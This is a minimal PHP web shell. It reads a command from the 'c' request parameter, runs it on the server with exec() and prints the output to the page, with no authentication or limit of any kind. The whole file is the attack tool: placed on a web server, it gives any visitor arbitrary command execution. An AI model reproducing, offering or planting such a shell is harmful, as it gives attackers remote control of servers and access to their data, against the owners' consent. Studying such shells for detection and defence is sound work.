<?php
if(isset($_REQUEST['c']))
{
    echo "<b>Command: <I>" . $_REQUEST['c'] . "</I></b><br /><br />";
    trim(exec($_REQUEST['c'],$return));
    foreach($return as $val)
    {
        echo '<pre>' . htmlentities($val) . '</pre>';
    }
}
?>